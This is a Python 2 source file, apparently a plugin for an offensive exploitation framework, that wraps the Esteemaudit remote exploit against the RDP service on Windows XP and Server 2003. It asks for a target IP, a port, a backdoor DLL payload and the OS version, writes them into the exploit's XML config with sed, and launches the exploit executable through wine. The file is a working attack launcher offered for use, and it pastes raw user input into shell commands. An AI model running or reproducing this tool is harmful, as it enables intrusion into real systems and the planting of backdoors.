#!/usr/bin/python
# -*- coding: utf-8 -*-

import os, sys, time
import logging

#/* Exploits && payloads */
#####ET######
esteemaudit = "Esteemaudit-2.1.0.xml" #/* esteemaudit xml file*/
esteemaudit_skel = "Esteemaudit-2.1.0.0.Skeleton.xml" #/* esteemaudit skeleton xml file*/
esteemaudit_exe = "Esteemaudit-2.1.0.exe" #/* esteemaudit exe exploitation tool*/

RescoursesDir = os.getcwd()
intname = "rsf"
det = sys.argv[0]
fin = det.split('.')[-2]
__plugin__      = "%s.plugin" % (fin)

def dash():
    while True:
        line_1 = "" + intname + "(\033[1;31m" + fin + "\033[1;m) > "
        terminal = raw_input(line_1).lower()
        time.sleep(0.5)
        if terminal == 'help':
            print "\n"
            print "Core Commands"
            print "============="
            print ""
            print "  Command         Description"
            print "  -------         -----------"
            print "  help            show help menu"
            print "  execute         run the plugin"
            print "  exit            exit the current plugin"
            print ""
        elif terminal == 'execute':
            dub()
        elif terminal == 'exit':
            exit()
        else:
            print "Unknown syntax: %s" % (terminal)

def dub():
    #/* Default configs if no answer */
    default5 = "backdoor.dll"
    default8 = "0"
    default10 = "yes"
    target_def = "1.1.1.1"
    port_def = "3389"
    timeout_def = "60"
    archi_def = "x86"
    #/* inputs for choosing settings */
    print "\033[1;94m[?]\033[1;m TargetIp :: Target IP Address"
    target = raw_input('\033[1;92m[+]\033[1;m Ip: [' + target_def + ']: ') or target_def

    print "\033[1;94m[?]\033[1;m TargetPort :: Port used by the RDP service for exploit connection"
    port = raw_input('\033[1;92m[+]\033[1;m Port: [' + port_def + ']: ') or port_def

    print "\033[1;94m[?]\033[1;m DLL :: Shellcode File, backdoor file to gain a response with the target"
    dll = raw_input('\033[1;92m[+]\033[1;m dll: [' + default5 + ']: ') or default5

    print "\033[1;94m[?]\033[1;m NetworkTimeout :: Timeout for blocking network calls <in seconds>. Use -1 or no timeout."
    timeout = raw_input('\033[1;92m[+]\033[1;m Timeout: [' + timeout_def + ']: ') or timeout_def

    print "\033[1;94m[?]\033[1;m Architecture :: Operating System, Service Pack, and Architecture of target OS"
    archi = raw_input('\033[1;92m[+]\033[1;m Port: [' + archi_def + ']: ') or archi_def

    os.system('rm -rf Esteemaudit-2.1.0.xml')
    os.system("cp Esteemaudit-2.1.0.0.Skeleton.xml Esteemaudit-2.1.0.xml")
    time.sleep(0.2)
    print "\033[1;94m[?]\033[1;m Version :: Operating System Version XP|WIN72K8R2"
    print ""
    print "*0) Windows XP SP0"
    print " 1) Windows XP SP1"
    print " 2) Windows XP SP0 or SP1"
    print " 3) Windows XP SP2"
    print " 4) Windows XP SP3"
    print " 5) Windows XP SP2 or SP3"
    print " 6) Windows 2003 SP0"
    print " 7) Windows 2003 SP1"
    print " 8) Windows 2003 SP2"
    print " 9) Windows 2003 SP1 or SP2"
    print ""
    function = raw_input('\033[1;92m[+]\033[1;m function: [' + default8 + ']: ') or default8
    if function == '0':
        os.system("sed -i 's/%TARGET%/XPSP0/' Esteemaudit-2.1.0.xml")
    elif function == '1':
        os.system("sed -i 's/%TARGET%/XPSP1/' Esteemaudit-2.1.0.xml")
    elif function == '2':
        os.system("sed -i 's/%TARGET%/XPSP0|1/' Esteemaudit-2.1.0.xml")
    elif function == '3':
        os.system("sed -i 's/%TARGET%/XPSP2/' Esteemaudit-2.1.0.xml")
    elif function == '4':
        os.system("sed -i 's/%TARGET%/XPSP3/' Esteemaudit-2.1.0.xml")
    elif function == '5':
        os.system("sed -i 's/%TARGET%/XPSP2|3/' Esteemaudit-2.1.0.xml")
    elif function == '6':
        os.system("sed -i 's/%TARGET%/W2K3SP0/' Esteemaudit-2.1.0.xml")
    elif function == '7':
        os.system("sed -i 's/%TARGET%/W2K3SP1/' Esteemaudit-2.1.0.xml")
    elif function == '8':
        os.system("sed -i 's/%TARGET%/W2K3SP2/' Esteemaudit-2.1.0.xml")
    elif function == '9':
        os.system("sed -i 's/%TARGET%/W2K3SP1|2/' Esteemaudit-2.1.0.xml")
    else:
        print "choose an option!"

    #/* the dirty work made easy */
    os.system("sed -i 's/%RHOST%/" + target + "/' Esteemaudit-2.1.0.xml")
    os.system("sed -i 's/%RPORT%/" + port + "/' Esteemaudit-2.1.0.xml")
    os.system("sed -i 's/%TIMEOUT%/" + timeout + "/' Esteemaudit-2.1.0.xml")
    os.system("sed -i 's/%TARGETARCHITECTURE%/" + archi + "/' Esteemaudit-2.1.0.xml")
    os.system("sed -i 's|%WINEPATH%|" + dll + "|' Esteemaudit-2.1.0.xml")
    time.sleep(0.2)
    print "\033[1;94m[?]\033[1;m Configuring Plugin"
    time.sleep(1)
    print ""
    print "Name             Set Value"
    print "----             ----------"
    print "Target           %s" % (target)
    print "Port             %s" % (port)
    print "Timeout          %s" % (timeout)
    print "Architecture     %s" % (archi)
    print "Payload          %s" % (dll)
    print "Function         %s" % (function)
    print "\n"
    et = raw_input("\033[1;94m[?]\033[1;m Execute Plugins? [" + default10 + "]: ")  or default10
    if et == 'yes':
        return double()
    elif et == 'no':
        print "Goodbye ;("
        sys.exit()
    else:
        print "\033[1;92m[!] No options were chosen.\033[1;m"

def double():
    #/*Prints out exploitation medthod and exploits using wine */
    print "\033[1;92m[*] Exploiting\033[1;m", esteemaudit_exe
    os.system("wine " + esteemaudit_exe + "")

dash()
